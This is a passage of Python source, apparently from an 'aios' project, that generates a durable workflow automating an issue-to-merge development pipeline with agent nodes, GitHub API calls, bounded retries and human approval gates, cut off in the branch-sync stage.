"""Reference dev-pipeline workflow script (the autodev#19 / aios#987 strange-loop endpoint).

This is autodev's development pipeline — ``spec-gate → implement → verify → risk →
merge-guard → mark-ready → merge → post-merge`` — re-expressed as a single durable aios
workflow. One run = one issue, end to end, mirroring one autodev "job". The full
state-machine design (every node, the agentic/computation partition, the dissolution
ledger, the credential model) lives in eumemic-company
``architecture/dev-pipeline-state-machine.md``.

The exported builders return workflow *source code* (the ``deep_research.py`` pattern):
``build_dev_pipeline_script`` is the production workload authored into the runtime via
``aios workflows create``; ``build_dev_pipeline_fixture_script`` is the CI variant with
tight iteration caps, driven by ``tests/integration/test_wf_dev_pipeline_fixture.py``
against the host with simulated agent/tool returns to prove the machine replays,
suspends on gates, resumes, and completes.

NODE PARTITION (see the design doc):
- **agentic** (``agent()``): implement, review, fix, ci-watch, risk — the five judgment nodes.
- **scripted** (``tool('http_request')`` / ``tool('bash')`` / in-script ``re``): the spec
  gate, PR/label/comment/status API calls, the merge-ref guard, mark-ready, merge.
- **gate** (``gate()``): every escalation — unsettled design, review/CI exhaustion, a
  no-commit fix, a fail-closed merge-guard refusal, high-risk merge approval. Each parks the
  run durably instead of dead-ending in autodev's ``awaiting_triage``. NOTE (issue #1176): the
  post-merge master-CI watch is NO LONGER a gate — the merge is a committed fact, so the run
  returns done on merge and the watch runs ADVISORY (a red/indeterminate result files a
  follow-up issue, never re-suspends the completed run).

CREDENTIALS: the run binds a vault providing ``GITHUB_TOKEN``. GitHub *API* calls go through
``tool('http_request', {server_ref: <github_server>, ...})`` (auth resolved against the bound
vault); the merge-guard git plumbing runs in ``tool('bash')`` (the token is an egress-proxy
placeholder, so ``git clone https://x-access-token:$GITHUB_TOKEN@github.com/...`` works); the
implement/fix/ci agents clone in their own child sandboxes. No ``gh`` CLI — REST + git only.
Note: ``http_request`` rejects a query string in ``path`` (the route allowlist is path-only),
so list endpoints are fetched with a clean path and filtered in-script.

DETERMINISM: the script imports only ``re``/``json`` (curated allowlist), keeps all capability
I/O in the value domain (``None``/``bool``/``int``/``float``/``str``/``list``/``dict``), and
emits capabilities in a fixed, bounded order — so replay-with-memo is stable.

V1 SCOPE (documented simplifications vs autodev, see the design doc §3/§9): the scripted spec
gate ports the empty-body / word-count / unresolved-marker checks; the assignee, duplicate-
closing-PR, and bug-report-signal classifiers are deferred (the cron-scanner's ``dispatched``
claim label + S4 PR-adoption cover the dominant dup-dispatch case). The merge-guard preserves
the load-bearing properties — validate the LIVE ``refs/pull/N/merge`` commit, fail-closed — and
runs the configured sentinel commands against it; per-sentinel path-prefix *selection* (an
efficiency optimisation, not a safety property) is deferred, so v1 runs every configured
sentinel (strictly safer: more checks, never fewer).

RESILIENCE CONTRACT (the Phase-0 hardening, aios#987; design doc §10):
1. **Read the full issue.** S1 ingests the body AND ``GET /issues/{n}/comments``; the spec
   gate counts words over body+comments and threads the comment array into every agent node
   (implement/review/fix) so a design pass in the thread reaches the coder. The marker trap
   still scans the BODY (no regression), but a body marker is SUPPRESSED when a later comment
   quotes the offending line AND carries a resolution signal (resolved/settled/answer:/
   decided/closed) — see ``spec_ok``. The comment thread is read in FULL: ``gh_paginated``
   requests ``?per_page=100`` and follows ``Link: rel="next"`` until the last page, so a
   design / spec resolution that lands as comment #31+ still reaches the spec gate and every
   downstream agent (#1156). The GitHub ``/repos/**`` route opts into ``allow_query`` (the
   route already grants every verb, so a pagination query cannot escalate it); the path-only
   ``?``-rejection (#485) still defends every other route by default.
2. **Retry transient 5xx.** Every scripted GitHub call goes through ``gh_retry`` — a bounded
   (≤3) loop that re-issues the request on a 5xx / transport error / ``{"error":...}`` and
   returns the last result for the caller to branch. Each retry is a fresh ``tool()`` await,
   so the CallKeyer assigns it a distinct per-content-hash ordinal (``#0``/``#1``/``#2``) and
   replay stays stable (the retry decision is a pure function of the memoized result).
3. **Surface failures, never zombie.** ``autodev:in-progress`` is labelled at ingest and
   removed on success; every terminal NON-gate failure ``return`` first labels
   ``autodev:failed``. A gate park is a durable suspension (auto-recover on resume), NOT a
   failure, so it is deliberately not labelled failed.
4. **Auto-recovery.** ``retry_count`` rides the input envelope; a re-launched run that arrives
   with ``retry_count >= MAX_RUN_RETRIES`` terminates at ``dead_letter`` instead of looping.
   The DEPLOY-TIME WIRING (Phase 2, not in this script): a ``run_completion`` trigger fires on
   ``status=errored`` and re-launches the workflow with ``retry_count + 1`` and the same
   ``{repo, issue_number}``. Re-launch is idempotent by construction — S4 lists open PRs and
   ADOPTS the branch's PR instead of creating a duplicate ("open-pr"; a 422 on create re-lists
   and adopts), and MERGE re-confirms ``GET /pulls/{n}.merged`` before declaring
   ``merge_failed`` so an already-merged PR is never double-merged or lost.
5. **AgentError guards.** Every agentic node (implement/review/fix/ci-watch/risk) runs under a
   defensive guard: an ``agent_not_found`` / transient agent error escalates to the relevant
   gate (design / verify) or, for the best-effort risk node, degrades to the conservative
   default — so a flaky judgment agent parks the run for a human instead of crashing it (an
   uncaught ``AgentError`` at the root fails the whole run). The post-merge master-CI watch is
   the one node that does NEITHER (issue #1176): the merge is already committed and the run has
   already returned done, so a flaky watch is RETRIED (≤ ``MAX_MASTER_CI_ITERS``) and, if still
   indeterminate, degrades to a distinct non-blocking advisory — never coerced to the
   most-blocking outcome and never allowed to re-suspend a completed run at a false gate.
"""

from __future__ import annotations

from typing import Any

from aios.models.agents import HttpRouteSpec, HttpServerSpec, ToolSpec
from aios.models.workflows import WorkflowCreate
from aios.workflows.comment_idempotency import COMMENT_IDEMPOTENCY_HELPERS
from aios.workflows.dev_pipeline_lib import DEV_PIPELINE_LIB
from aios.workflows.gh_body import GH_BODY_HELPERS

# ─── default judgment-node agent ids (override per deployment) ───────────────
DEFAULT_IMPLEMENT_AGENT_ID = "dev-implement"
DEFAULT_REVIEW_AGENT_ID = "dev-review"
DEFAULT_FIX_AGENT_ID = "dev-fix"
DEFAULT_CI_AGENT_ID = "dev-ci-watch"
DEFAULT_RISK_AGENT_ID = "dev-risk"

# ─── output schemas the agentic nodes are forced to return ───────────────────
IMPLEMENT_SCHEMA: dict[str, Any] = {
    "type": "object",
    "additionalProperties": False,
    "required": ["branch", "pr_title", "pr_body", "escalated"],
    "properties": {
        "branch": {"type": "string"},
        "pr_title": {"type": "string"},
        "pr_body": {"type": "string"},
        "escalated": {"type": "boolean"},
        "escalation_reason": {"type": "string"},
        "impl_notes": {"type": "string"},
    },
}

REVIEW_SCHEMA: dict[str, Any] = {
    "type": "object",
    "additionalProperties": False,
    "required": ["verdict", "issues", "artifact_posted"],
    "properties": {
        "verdict": {"type": "string", "enum": ["pass", "fail"]},
        "issues": {"type": "array", "items": {"type": "string"}},
        "artifact_posted": {"type": "boolean"},
    },
}

FIX_SCHEMA: dict[str, Any] = {
    "type": "object",
    "additionalProperties": False,
    "required": ["head_sha", "pushed"],
    "properties": {
        "head_sha": {"type": "string"},
        "pushed": {"type": "boolean"},
        "notes": {"type": "string"},
    },
}

CI_SCHEMA: dict[str, Any] = {
    "type": "object",
    "additionalProperties": False,
    "required": ["status"],
    "properties": {
        "status": {"type": "string", "enum": ["green", "red", "no_ci"]},
        "detail": {"type": "string"},
        # The commit the watch ACTUALLY polled check-runs for. ``_ci_verdict`` verifies this
        # equals the LIVE PR head before trusting a green/no_ci verdict (#1314): a watch that
        # polled an orphan / wrong-parent commit (so `total_count=0` reads as `no_ci`) must
        # never count as a pass on a PR whose real head is red. Omitted -> the verdict is
        # SHA-unverifiable, so a green/no_ci is NOT trusted (fail-closed).
        "polled_sha": {"type": "string"},
        # True only when the FULL required-check set has CONCLUDED (not merely a subset +
        # a clean commit-status). A green declared while lint/unit are still running is a
        # premature-green (#1364); when False ``_ci_verdict`` does not trust a green verdict and
        # defers to the uncorrelated merge-guard. Omitted -> treated as not-complete
        # (fail-closed: an old agent that can't report completeness can't manufacture a green).
        "required_complete": {"type": "boolean"},
    },
}

RISK_SCHEMA: dict[str, Any] = {
    "type": "object",
    "additionalProperties": False,
    "required": ["tier", "summary"],
    "properties": {
        "tier": {"type": "integer", "minimum": 1, "maximum": 4},
        "summary": {"type": "string"},
    },
}

# Scripted spec-gate constants (the empty-body / word-count / unresolved-marker subset of
# autodev validation.py; see V1 SCOPE).
MIN_SPEC_BODY_WORDS = 50
MIN_BUG_BODY_WORDS = 20
SPEC_BLOCKERS: tuple[str, ...] = (
    r"(?i)\b[A-Z][A-Za-z]+:\s*TBD\b",
    r"(?i)\bopen question",
    r"(?i)needs? (more |further )?(design|discussion|thought|spec|input|clarification)",
    r"(?i)TODO[:\s].*spec",
)
# A later comment SUPPRESSES a body marker only when it both (a) quotes the offending
# line and (b) carries one of these resolution signals — so a passing mention of "open
# question" can't unlock the gate, but an explicit "Resolved: <quoted line> — use a typed
# enum" does. Word-boundaried and case-insensitive (the body marker-trap itself is
# untouched: a marker the comments never resolve still bounces).
RESOLUTION_SIGNALS: tuple[str, ...] = (
    r"(?i)\bresolved\b",
    r"(?i)\bsettled\b",
    r"(?i)\banswer\s*:",
    r"(?i)\bdecided\b",
    r"(?i)\bclosed\b",
)

# Failure-surfacing labels (item 3): never a silent zombie. ``IN_PROGRESS`` is applied at
# ingest and removed on success; ``FAILED`` is applied on every terminal NON-gate failure
# (a gate park is a durable suspension, not a failure, so it is NOT labelled failed).
LABEL_IN_PROGRESS = "autodev:in-progress"
LABEL_FAILED = "autodev:failed"

# Stable heading markers on the chairman-facing comments this pipeline posts. Each heading is
# BOTH the comment's first line AND the maker-marker the replay guard scans for: a posted
# comment is its own "already done" marker on the next read, so an at-least-once replay (the
# POST ran, the worker crashed before journaling) never duplicates it (aios#1292 — the class
# shared with triage_pipeline, closed via the same comment_idempotency helper).
MARKER_SPEC_NOT_READY = "## Spec not ready for implementation"
MARKER_RISK_ASSESSMENT = "## Risk Assessment"
MARKER_MERGE_GUARD = "## Merge guard refused"
MARKER_REBASE_CONFLICT = "## Rebase conflict — branch could not be healed"

# Dispatch-claim label (#1188): the cron-scanner / dev-conveyor stamps an issue ``dispatched``
# when it launches a run for it. Like ``IN_PROGRESS`` it is an IN-FLIGHT claim that must be
# stripped at the terminal post-merge cleanup — otherwise a merged-but-open issue reads as
# live to a dispatch-gate sweep or a rank-6 staleness reaper. It is NOT applied by this
# script (the conveyor owns the stamp); the post-merge node only REMOVES it, best-effort.
LABEL_DISPATCHED = "dispatched"

# Auto-recovery (item 4): a re-launched run carries ``retry_count`` in its input envelope;
# the deploy-time ``run_completion`` trigger (Phase 2) re-launches an ``errored`` run with
# ``retry_count + 1``. The script-level guard bounds that loop: a run that arrives with
# ``retry_count >= MAX_RUN_RETRIES`` terminates at the dead-letter state instead of looping.
MAX_RUN_RETRIES = 2

# Post-merge master-CI watch is ADVISORY (issue #1176): the merge is a committed fact and the
# run returns done the moment the merge confirms. A flaky watch agent must never re-suspend a
# completed run, so an AgentError / malformed return is RETRIED a bounded number of times
# before the watch is declared indeterminate (a signal distinct from a genuinely-red master).
MAX_MASTER_CI_ITERS = 3

# CI-fix lint guidance (#1182): the GitHub CI ``lint`` job runs BOTH ``ruff check`` AND
# ``ruff format --check``. A format-only failure (``Would reformat: …``) is NOT fixed by
# ``ruff check --fix`` — it needs ``ruff format``. PR #1173 parked at the verify gate because
# the CI-fix loop ran only ``ruff check --fix`` and exhausted all 3 iterations on a trivially
# fixable format-only failure. This hint rides the ``fix_ci`` task so the fix agent knows to
# run ``ruff format`` (write mode) for a formatting failure, making it auto-fixable.
FIX_CI_LINT_HINT = (
    "The CI `lint` job runs BOTH `ruff check` AND `ruff format --check`. If the failure is "
    "formatting-only (e.g. `Would reformat: <file>`), `ruff check --fix` will NOT resolve it "
    "— you MUST run `ruff format` (write mode, not --check) over the affected paths and "
    "commit the result. Run both `ruff check --fix` and `ruff format` so a combined "
    "lint+format failure is fully resolved before re-pushing."
)

# Rebase/sync recovery (#1385): when master moves under an open PR it goes DIRTY/non-
# mergeable, GitHub can't compute ``refs/pull/N/merge``, CI never re-runs and the run jams at
# the CI watch. The sync stage HEALS the branch instead of parking: a mechanical
# ``git rebase origin/master`` + force-push-with-lease in a bash node, and — only if that hits
# REAL conflicts — a bounded (≤MAX_REBASE_ATTEMPTS) hand-off to the SAME fix agent ``fix_ci``
# uses, with a resolve-conflicts task. Still unresolved after the budget parks at a NEW,
# distinct ``rebase_conflict`` gate (never the orphaned-at-CI jam, never a silent zombie).
MAX_REBASE_ATTEMPTS = 2

# Distinct bash exit codes the mechanical rebase node uses so the orchestrator can branch on
# the OUTCOME (a value, never a raise) — mirrors the merge-guard's fail-closed exit-code style:
#   0  -> rebased (or already current: an idempotent no-op re-run leaves the branch as-is)
#   75 -> the branch is ALREADY current with origin/master (no rebase was needed) — a no-op
#   76 -> the mechanical rebase hit REAL conflicts (a hand-off to the fix agent is required)
#   77 -> a structural/plumbing failure (clone/fetch/push) the rebase could not even attempt
REBASE_EXIT_DONE = 0
REBASE_EXIT_NOOP = 75
REBASE_EXIT_CONFLICT = 76
REBASE_EXIT_ERROR = 77

# The resolve-conflicts hand-off rides this hint so the fix agent (the same one ``fix_ci``
# invokes) knows the task is a rebase-conflict resolution, not a CI failure: rebase onto
# origin/master, resolve the conflict markers, commit, and force-push-with-lease the branch.
FIX_REBASE_HINT = (
    "This is a REBASE-CONFLICT resolution, not a CI fix. Master moved under this PR and a "
    "mechanical `git rebase origin/master` hit conflicts the machine could not auto-resolve. "
    "Fetch `origin/master`, rebase the PR branch onto it, resolve every conflict by hand "
    "(remove all conflict markers, keep both intents correct), run the tests, then "
    "`git push --force-with-lease` the rebased branch. Return the new head_sha."
)


def _py(name: str, value: Any) -> str:
    """One ``NAME = <repr>`` constant line for the prepended header. ``repr`` over the
    value domain (str/int/bool/tuple/dict/list-of-those) yields valid, deterministic Python —
    avoiding the ``{{}}`` escaping a single f-string body would force."""
    return f"{name} = {value!r}"


def _render_constants(
    *,
    implement_agent_id: str,
    review_agent_id: str,
    fix_agent_id: str,
    ci_agent_id: str,
    risk_agent_id: str,
    github_server: str,
    base_branch: str,
    merge_sentinels: list[str],
    max_review_iters: int,
    max_ci_iters: int,
    auto_merge_max_tier: int,
    merge_method: str,
    default_model: str | None,
) -> str:
    lines = [
        _py("IMPLEMENT_AGENT_ID", implement_agent_id),
        _py("REVIEW_AGENT_ID", review_agent_id),
        _py("FIX_AGENT_ID", fix_agent_id),
        _py("CI_AGENT_ID", ci_agent_id),
        _py("RISK_AGENT_ID", risk_agent_id),
        _py("GITHUB_SERVER", github_server),
        _py("BASE_BRANCH", base_branch),
        _py("MERGE_SENTINELS", list(merge_sentinels)),
        _py("MAX_REVIEW_ITERS", max_review_iters),
        _py("MAX_CI_ITERS", max_ci_iters),
        _py("AUTO_MERGE_MAX_TIER", auto_merge_max_tier),
        _py("MERGE_METHOD", merge_method),
        _py("DEFAULT_MODEL", default_model),
        _py("MIN_SPEC_BODY_WORDS", MIN_SPEC_BODY_WORDS),
        _py("MIN_BUG_BODY_WORDS", MIN_BUG_BODY_WORDS),
        _py("SPEC_BLOCKERS", list(SPEC_BLOCKERS)),
        _py("RESOLUTION_SIGNALS", list(RESOLUTION_SIGNALS)),
        _py("LABEL_IN_PROGRESS", LABEL_IN_PROGRESS),
        _py("LABEL_FAILED", LABEL_FAILED),
        _py("LABEL_DISPATCHED", LABEL_DISPATCHED),
        _py("MARKER_SPEC_NOT_READY", MARKER_SPEC_NOT_READY),
        _py("MARKER_RISK_ASSESSMENT", MARKER_RISK_ASSESSMENT),
        _py("MARKER_MERGE_GUARD", MARKER_MERGE_GUARD),
        _py("MARKER_REBASE_CONFLICT", MARKER_REBASE_CONFLICT),
        _py("MAX_RUN_RETRIES", MAX_RUN_RETRIES),
        _py("MAX_MASTER_CI_ITERS", MAX_MASTER_CI_ITERS),
        _py("MAX_REBASE_ATTEMPTS", MAX_REBASE_ATTEMPTS),
        _py("REBASE_EXIT_DONE", REBASE_EXIT_DONE),
        _py("REBASE_EXIT_NOOP", REBASE_EXIT_NOOP),
        _py("REBASE_EXIT_CONFLICT", REBASE_EXIT_CONFLICT),
        _py("REBASE_EXIT_ERROR", REBASE_EXIT_ERROR),
        _py("FIX_CI_LINT_HINT", FIX_CI_LINT_HINT),
        _py("FIX_REBASE_HINT", FIX_REBASE_HINT),
        _py("IMPLEMENT_SCHEMA", IMPLEMENT_SCHEMA),
        _py("REVIEW_SCHEMA", REVIEW_SCHEMA),
        _py("FIX_SCHEMA", FIX_SCHEMA),
        _py("CI_SCHEMA", CI_SCHEMA),
        _py("RISK_SCHEMA", RISK_SCHEMA),
    ]
    return "\n".join(lines)


# The static script body — references the prepended constants. Pure stdlib (re/json),
# value-domain I/O, bounded loops: replay-stable by construction.
_BODY = r"""
import json
import re

# NOTE: the scripted/proven helpers (spec gate, gh plumbing, SHA checks, merge-guard +
# rebase, risk floor, label/close plumbing, _ci_verdict/_shas_equal, _watch_ci/_sync_branch)
# live in ``dev_pipeline_lib.DEV_PIPELINE_LIB`` and are spliced in below the state machine by
# ``build_dev_pipeline_script`` (the same source-string sharing pattern as GH_BODY_HELPERS).
# Module-level defs resolve names at CALL time, so the state machine here can call them
# freely even though their ``def``s are appended after this block.


# ─── residue_kind stamp at the gate-resolve source (aios#1328, locus (b)) ─────
# The de-Goodharted residue gauge demands that the WHY of a human-in-loop gate is
# STAMPED at the source by the finder, on the gate-resolve payload — never inferred
# from prose by the ops-agent (the completion-marker antipattern one level up). The
# platform resolve handler cannot enforce this (it never persists the gate kind down
# the suspend/resolve path), so the guarantee is WORKFLOW-AUTHOR-ENFORCED here: the
# script knows its own ``kind``, so this wrapper demands ``residue_kind`` exactly for
# the human-in-loop kinds it itself authors (merge_approval, design) and nowhere else.

# The human-in-loop gate kinds (the ONLY kinds that require a residue_kind stamp).
# A non-human-in-loop gate (verify, merge_guard) does NOT require the key.
HUMAN_IN_LOOP_GATE_KINDS = ("merge_approval", "design")

# The four human-in-loop residue KINDS plus the OPEN ``other`` sentinel — the set
# a resolve payload's ``residue_kind`` must fall within. Frozen here in the workflow
# the author controls (mirrors aios.db.queries.residue.ACCEPTED_GATE_RESIDUE_KINDS).
ACCEPTED_RESIDUE_KINDS = (
    "uncorrelated-detection",
    "deadlock-break",
    "design-judgment",
    "ladder-top-approval",
    "other",
)


async def human_gate(spec):
    """``gate(spec)`` for a HUMAN-IN-LOOP kind, with the residue_kind stamp enforced.

    Suspends like ``gate`` and, on resume, inspects the returned ``result`` and REJECTS
    the resolve as incomplete -- raising, so the run does NOT proceed past the gate -- if
    ``residue_kind`` is absent or outside {the four kinds} + {other}. The kind is thus
    captured at the moment of human judgment, never reconstructed from prose; the ops-agent's
    axis-2 INSERT later copies this finder's-own stamp verbatim (it classifies, not defines).

    For a NON-human-in-loop kind this is a plain ``gate`` (no stamp demanded) -- but callers
    should only route the human-in-loop kinds through here."""
    kind = spec.get("kind") if isinstance(spec, dict) else None
    result = await gate(spec)
    if kind in HUMAN_IN_LOOP_GATE_KINDS:
        residue_kind = result.get("residue_kind") if isinstance(result, dict) else None
        if residue_kind not in ACCEPTED_RESIDUE_KINDS:
            # The resolve is INCOMPLETE: the finder did not stamp the WHY. Reject it --
            # the run must not proceed past the gate. A re-resume carrying a valid
            # residue_kind (the workflow-crash-contract re-delivery) completes normally.
            raise ValueError(
                "human-in-loop gate %r resolved without a valid residue_kind "
                "(got %r; expected one of %r) -- the finder must stamp the WHY at the "
                "gate-resolve source (aios#1328); refusing to let the run proceed "
                "unstamped." % (kind, residue_kind, ACCEPTED_RESIDUE_KINDS)
            )
    return result


# ─── the state machine ───────────────────────────────────────────────────────

async def main(input):
    payload = _unwrap(input)
    repo = payload["repo"]
    issue_number = int(payload["issue_number"])
    kind = payload.get("kind", "issue")
    model = payload.get("model") or DEFAULT_MODEL
    # Auto-recovery (item 4): the Phase-2 run_completion trigger re-launches an errored run
    # with retry_count+1. Bound that loop here so a deterministically-failing run dead-letters
    # instead of looping forever; a missing/garbage value floors to 0 (first attempt).
    try:
        retry_count = int(payload.get("retry_count") or 0)
    except (TypeError, ValueError):
        retry_count = 0
    if retry_count >= MAX_RUN_RETRIES:
        log("retry budget exhausted (retry_count=%d) -> dead-letter" % retry_count)
        return await _fail(repo, issue_number,
                           {"state": "dead_letter", "retry_count": retry_count,
                            "reason": "exceeded MAX_RUN_RETRIES (%d) auto-recovery attempts" % MAX_RUN_RETRIES})
    escalations = []

    # S1 — ingest the issue: body AND the comment thread (item 1). A design pass / resolved-
    # decision lives in comments; thread it into the gate (word-count + marker-resolution) and
    # every downstream agent. Claim the issue with autodev:in-progress so an in-flight run is
    # never a silent zombie (item 3); it is removed on success / replaced by autodev:failed.
    phase("ingest")
    await _label(repo, issue_number, LABEL_IN_PROGRESS)
    resp = await gh("GET", _ipath(repo, "/issues/%d" % issue_number))
    issue = _json_body(resp)
    if _status(resp) != 200 or issue is None:
        return await _fail(repo, issue_number,
                           {"state": "error", "reason": "could not read issue %d (status %r)"
                            % (issue_number, _status(resp))})
    # Read the FULL thread, not just GitHub's first 30: gh_paginated follows
    # Link: rel="next" so a design/spec resolution posted as comment #31+ is ingested
    # (#1156). A comments-endpoint failure degrades to whatever pages were gathered
    # (empty -> body-only, autodev's pattern).
    comments = await gh_paginated(_ipath(repo, "/issues/%d/comments" % issue_number))
    if not isinstance(comments, list):
        comments = []
    comment_bodies = _comment_texts(comments)

    # S2 — scripted pre-flight spec gate (regex/word-count over body+comments; fail-fast).
    phase("spec-gate")
    ok, reason = spec_ok(issue, kind, comments)
    if not ok:
        log("spec gate failed:", reason)
        # Label-before-comment + maker-marker dedup (aios#1292): apply the `underspecified`
        # label FIRST (idempotent/additive), then post the explanation comment ONLY if the
        # already-fetched thread doesn't already carry the marker — so an at-least-once replay
        # doesn't post a second "spec not ready" comment.
        await gh("POST", _ipath(repo, "/issues/%d/labels" % issue_number),
                 {"labels": ["underspecified"]})
        await post_comment_once(repo, issue_number, MARKER_SPEC_NOT_READY,
                                MARKER_SPEC_NOT_READY + "\n\n" + reason, comments)
        return await _fail(repo, issue_number, {"state": "spec_failed", "reason": reason})

    # A3 — implement (the coding agent: clone, explore, plan, TDD, self-review, push). The
    # comment thread rides along so a design pass reaches the coder. An agent error escalates
    # to the design gate (item 5) instead of crashing the run.
    phase("implement")
    try:
        impl = await agent(
            {"task": "implement", "repo": repo, "issue_number": issue_number, "kind": kind,
             "title": issue.get("title", ""), "body": issue.get("body", ""),
             "comments": comment_bodies},
            agent_id=IMPLEMENT_AGENT_ID, output_schema=IMPLEMENT_SCHEMA, model=model,
            label="implement")
    except AgentError as exc:
        impl = {"escalated": True,
                "escalation_reason": "implement agent error: %s" % exc}
    if impl.get("escalated"):
        escalations.append("design")
        decision = await human_gate({"kind": "design", "issue": issue_number,
                                     "question": impl.get("escalation_reason", "")})
        if not (isinstance(decision, dict) and decision.get("resolved")):
            return {"state": "escalated", "reason": "design", "escalations": escalations}
        # resumed with a settled direction -> re-implement with the chairman's answer
        try:
            impl = await agent(
                {"task": "implement", "repo": repo, "issue_number": issue_number, "kind": kind,
                 "title": issue.get("title", ""), "body": issue.get("body", ""),
                 "comments": comment_bodies, "resolution": decision.get("resolution", "")},
                agent_id=IMPLEMENT_AGENT_ID, output_schema=IMPLEMENT_SCHEMA, model=model,
                label="implement-resumed")
        except AgentError as exc:
            return await _fail(repo, issue_number,
                               {"state": "failed_implement", "escalations": escalations,
                                "reason": "implement agent error after resume: %s" % exc})
    try:
        branch = impl["branch"]
    except (KeyError, TypeError) as exc:
        return await _fail(repo, issue_number,
                           {"state": "failed_implement", "escalations": escalations,
                            "reason": "implement returned no branch: %s" % exc})

    # S4 — open / reconcile the PR. List open PRs (clean path; filter in-script), adopt one
    # for this branch if present, else create. A create that 422s (PR already exists, e.g. a
    # crash re-drive) re-lists and adopts — so the call is at-least-once tolerant.
    phase("open-pr")
    open_list = await gh("GET", _ipath(repo, "/pulls"))
    pr = _find_open_pr(_json_body(open_list), branch)
    if pr is None:
        created = await gh("POST", _ipath(repo, "/pulls"),
                           {"title": impl["pr_title"], "body": impl["pr_body"],
                            "head": branch, "base": BASE_BRANCH, "draft": True})
        if _status(created) in (200, 201):
            pr = _json_body(created)
        elif _status(created) == 422:  # already exists (re-drive / race) -> adopt it
            pr = _find_open_pr(_json_body(await gh("GET", _ipath(repo, "/pulls"))), branch)
        if pr is None:
            return await _fail(repo, issue_number,
                               {"state": "failed_no_pr",
                                "reason": "could not open or adopt a PR for branch %r (status %r)"
                                % (branch, _status(created))})
    pr_number = int(pr["number"])
    pr_node_id = pr.get("node_id", "")
    pr_url = pr.get("html_url", "")
    head_sha = _pr_head_sha(pr)

    # A5/S6/A7/S8 — verify loop (review->fix), bounded; artifact + no-commit guards. The loop
    # runs MAX_REVIEW_ITERS fixes each followed by a re-review (the trailing iteration is the
    # final re-review of the last fix — autodev's for/else off-by-one fix).
    phase("verify")
    review_ok = False
    for i in range(MAX_REVIEW_ITERS + 1):
        # A review-agent error escalates to the verify gate (item 5) — a flaky reviewer
        # parks for a human rather than crashing the run. Resume-resolved continues.
        try:
            review = await agent(
                {"task": "review", "repo": repo, "pr_number": pr_number, "head_sha": head_sha,
                 "comments": comment_bodies},
                agent_id=REVIEW_AGENT_ID, output_schema=REVIEW_SCHEMA, model=model,
                label="review-%d" % i)
        except AgentError as exc:
            escalations.append("verify")
            decision = await gate({"kind": "verify", "pr": pr_number,
                                   "reason": "review agent error: %s" % exc})
            if not (isinstance(decision, dict) and decision.get("resolved")):
                return {"state": "escalated", "reason": "verify_agent_error",
                        "escalations": escalations}
            review_ok = True
            break
        if not review.get("artifact_posted"):
            escalations.append("verify")
            decision = await gate({"kind": "verify", "pr": pr_number,
                                   "reason": "code-review posted no `### Code review` artifact"})
            if not (isinstance(decision, dict) and decision.get("resolved")):
                return {"state": "escalated", "reason": "verify_no_artifact",
                        "escalations": escalations}
            review_ok = True
            break
        if review["verdict"] == "pass" or not review["issues"]:
            review_ok = True
            break
        if i == MAX_REVIEW_ITERS:  # final re-review still failing -> exhausted
            break
        before = head_sha
        try:
            fix = await agent(
                {"task": "fix", "repo": repo, "pr_number": pr_number, "issues": review["issues"],
                 "comments": comment_bodies},
                agent_id=FIX_AGENT_ID, output_schema=FIX_SCHEMA, model=model, label="fix-%d" % i)
            head_sha = fix["head_sha"]
        except AgentError as exc:
            escalations.append("verify")
            decision = await gate({"kind": "verify", "pr": pr_number,
                                   "reason": "fix agent error: %s" % exc})
            if not (isinstance(decision, dict) and decision.get("resolved")):
                return {"state": "escalated", "reason": "verify_agent_error",
                        "escalations": escalations}
            review_ok = True
            break
        if before and head_sha == before:  # empirical no-commit guard (head unchanged)
            escalations.append("verify")
            decision = await gate({"kind": "verify", "pr": pr_number,
                                   "reason": "fix agent produced no new commit"})
            if not (isinstance(decision, dict) and decision.get("resolved")):
                return {"state": "escalated", "reason": "verify_no_commit",
                        "escalations": escalations}
            review_ok = True
            break
    if not review_ok:
        escalations.append("verify")
        decision = await gate({"kind": "verify", "pr": pr_number,
                               "reason": "review still failing after %d fix iterations"
                               % MAX_REVIEW_ITERS})
        if not (isinstance(decision, dict) and decision.get("resolved")):
            return {"state": "escalated", "reason": "verify_exhausted",
                    "escalations": escalations}

    # A9 — CI watch (the agent OWNS the durable wait) -> fix -> re-watch, bounded
    # (N watches, N-1 fixes — matches autodev's CI loop). Factored into _watch_ci so the
    # post-rebase re-entry below can drive the identical loop with a distinct label prefix.
    ci_ok, ci_agent_error, head_sha = await _watch_ci(
        repo, pr_number, head_sha, comment_bodies, model, "ci")
    if not ci_ok:
        _ci_reason = ("CI-watch agent error" if ci_agent_error
                      else "CI failing after %d checks" % MAX_CI_ITERS)
        escalations.append("verify")
        decision = await gate({"kind": "verify", "pr": pr_number, "reason": _ci_reason})
        if not (isinstance(decision, dict) and decision.get("resolved")):
            return {"state": "escalated",
                    "reason": "ci_agent_error" if ci_agent_error else "ci_exhausted",
                    "escalations": escalations}

    # S-SYNC — rebase/sync recovery (#1385). Early in the merge path (BEFORE the merge guard)
    # and on every run re-entry: check mergeability and HEAL a branch master moved under
    # instead of parking or orphaning it. A clean/already-current branch is an idempotent
    # no-op (safe under the at-least-once crash contract). A DIRTY/behind branch is
    # mechanically rebased + force-pushed-with-lease; a real conflict is handed to the SAME
    # fix agent (bounded ≤MAX_REBASE_ATTEMPTS). Still unresolved -> park at the NEW, distinct
    # `rebase_conflict` gate. After a successful rebase RE-ENTER the CI watch (CI must re-run
    # on the updated branch) before proceeding to merge.
    phase("sync")
    sync = await _sync_branch(repo, pr_number, branch, comment_bodies, model)
    if sync["outcome"] in ("conflict", "error"):
        detail = sync.get("detail", "")
        await post_markered_comment(repo, pr_number, MARKER_REBASE_CONFLICT,
                                    "%s\n\n```\n%s\n```" % (MARKER_REBASE_CONFLICT, detail))
        escalations.append("rebase_conflict")
        decision = await gate({"kind": "rebase_conflict", "pr": pr_number, "detail": detail})
        if not (isinstance(decision, dict) and decision.get("resolved")):
            return {"state": "escalated", "reason": "rebase_conflict",
                    "pr_url": pr_url, "pr_number": pr_number, "escalations": escalations}
    elif sync["outcome"] == "rebased":
        # The branch was rebased onto master: a new tip was force-pushed, so CI MUST re-run on
        # the updated branch before merge. Re-enter the CI watch (distinct `reci` label prefix
        # keeps replay deterministic). A fix-advanced head_sha overrides the (now-stale) one.
        if sync.get("head_sha"):
            head_sha = sync["head_sha"]
        ci_ok, ci_agent_error, head_sha = await _watch_ci(
            repo, pr_number, head_sha, comment_bodies, model, "reci")
        if not ci_ok:
            _ci_reason = ("CI-watch agent error after rebase" if ci_agent_error
                          else "CI failing after %d checks after rebase" % MAX_CI_ITERS)
            escalations.append("verify")
            decision = await gate({"kind": "verify", "pr": pr_number, "reason": _ci_reason})
